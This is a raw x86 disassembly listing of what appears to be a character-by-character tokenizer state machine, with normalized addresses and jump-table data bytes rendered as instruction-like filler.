push edi
push edx
push eax
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10012bd0
push ebx
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x21
call sub_10079d20
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x28
pop esi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax esi
call sub_10079d20
mov edi [ ebp + 0x14 ]
push esi
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100791e0
mov esi [ edi + 0x8 ]
mov ecx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x13
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x4 ] 0x1
call sub_100797e0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push 0x15
call sub_100791e0
add esp 0x4
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10012bd0
lea eax [ esi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007c5bb
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
add al 0x3
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0x6060606
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add ecx esp
int3
sub_1007c620
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
sub eax 0x25
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov edi 0x1
je r-xdata
mov eax 0x22
sub eax edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ ebx + 0x4 ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax 0x27
jmp r-xdata
sub eax edi
je r-xdata
push eax
push 0x26
push esi
call sub_1005ada0
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
add esp 0xc
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_1005ada0
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax [ r--data ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
push eax
lea edx [ ebx + 0x94 ]
push edx
push esi
call sub_10056120
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov eax 0x3e
mov [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ edi + 0x1f ]
jmp r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ edi + 0x48 ] eax
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_1005ada0
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ edi + 0x48 ] eax
sub_1007c7a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_10079d20
mov eax [ ebp + 0x10 ]
inc eax
cmp eax 0x3f
ja r-xdata
push 0x17
mov eax ebx
call sub_100791e0
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
movzx eax [ eax + lookup_table_1007c868 ]
jmp [ eax * 4 + jump_table_1007c854 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebx + 0x8 ]
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push ebx
mov [ eax ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop ebx
pop ebp
retn
push 0x16
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100797e0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007c86d
add al 0x4
add al 0x4
add al 0x1
add [ ecx + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007c8b0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0x19
mov eax ebx
call sub_100791e0
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_100797e0
pop ebx
mov eax 0x2
pop ebp
retn
cmp eax 0x3e
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edx ] 0x0
push eax
mov [ ecx + 0x78 ] 0x1
call sub_100796a0
add esp 0x4
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x1a
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
pop esi
mov eax 0x2
pop ebp
retn
sub_1007c940
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3e
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_100798b0
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
pop edi
pop ebx
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push eax
push esi
call sub_1005ada0
lea edi [ ebx + 0x94 ]
push edi
call sub_1000ac10
push edi
call sub_100298f0
add esp 0x14
cmp eax 0x3e
jne r-xdata
mov eax 0xfffd
cmp eax 0xffffffff
je r-xdata
sub_1007c9a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx 0x1
push ebx
push 0x2
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10034680
add esp 0x10
test eax eax
je r-xdata
push 0x0
push 0x7
push r--data
push esi
call sub_10034680
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x2d
mov [ edi + 0x4 ] ebx
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push r--data
mov [ edx ] 0x33
push esi
mov [ edi + 0x4 ] ebx
call sub_1004ab70
push r--data
push esi
mov [ edi + 0x7c ] eax
call sub_1004ab70
push r--data
push esi
mov [ edi + 0x80 ] eax
call sub_1004ab70
add esp 0x18
mov [ edi + 0x84 ] eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1b
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
add esp 0x4
mov [ edi + 0x4 ] ebx
call sub_10079360
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
push ebx
push 0x7
push r--data
push esi
call sub_10034680
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x43
mov [ edi + 0x4 ] ebx
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007caa0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x2f
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007cb8c ]
jmp [ eax * 4 + jump_table_1007cb78 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x2e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100798b0
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100798b0
xor eax eax
pop esi
pop ebp
retn
sub_1007cb91
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007cbd0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007cce0 ]
jmp [ eax * 4 + jump_table_1007cccc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100798b0
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ edx ] 0x0
call sub_100798b0
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007cce5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
push esi
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100798b0
xor eax eax
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x30
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
sub_1007cdc0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100798b0
pop edi
xor eax eax
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1005ada0
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
cmp edi 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
mov [ ecx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_1007ce90
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1005ada0
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007cff0 ]
jmp [ eax * 4 + jump_table_1007cfd8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_100798b0
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1e
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x32
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1f
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1005ada0
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100798b0
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007cff6
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020505
add eax 0x5050505
add eax 0x5050505
add eax [ 0x5050505 ]
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x30
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d1a0 ]
jmp [ eax * 4 + jump_table_1007d18c ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_1005ada0
add esp 0x24
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_100798b0
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1005ada0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x21
push esi
call sub_1005ada0
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1005ada0
add esp 0x34
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x21
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_100798b0
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007d1a5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x21
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x24
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx 0x1
mov [ edx ] 0x34
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d27c ]
jmp [ eax * 4 + jump_table_1007d270 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x34
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007d27f
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ ecx ]
add [ edx ] eax
add [ edx ] eax
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
sub_1007d2a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007d3b8 ]
jmp [ ecx * 4 + jump_table_1007d3a4 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1005ada0
add esp 0xc
add eax 0x20
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x35
mov [ eax + 0x88 ] 0x1
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007d3bd
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007d400
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007d54c ]
jmp [ ecx * 4 + jump_table_1007d538 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1005ada0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
add eax 0x20
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ edx ] 0x36
mov eax [ edi + 0x7c ]
add edi 0x7c
push eax
push esi
call sub_1006db40
push edi
call sub_100793d0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ecx ] 0x0
mov edx [ edi + 0x7c ]
add edi 0x7c
push edx
push esi
call sub_1006db40
push edi
call sub_100793d0
mov eax [ ebp + 0x14 ]
add esp 0xc
call sub_10079630
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ r--data ]
add eax 0x10
push eax
push ecx
push esi
call sub_1005ada0
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
lea edi [ eax + 0x7c ]
mov [ eax + 0x88 ] 0x1
mov eax [ edi ]
push eax
push esi
call sub_1006db40
push edi
call sub_100793d0
mov eax [ ebp + 0x14 ]
add esp 0x10
call sub_10079630
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007d551
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007d590
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x6
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10034680
add esp 0x10
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_1007d6a4 ]
jmp [ eax * 4 + jump_table_1007d694 ]
push 0x0
push 0x6
push r--data
push esi
call sub_10034680
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x37
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079630
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x26
mov eax esi
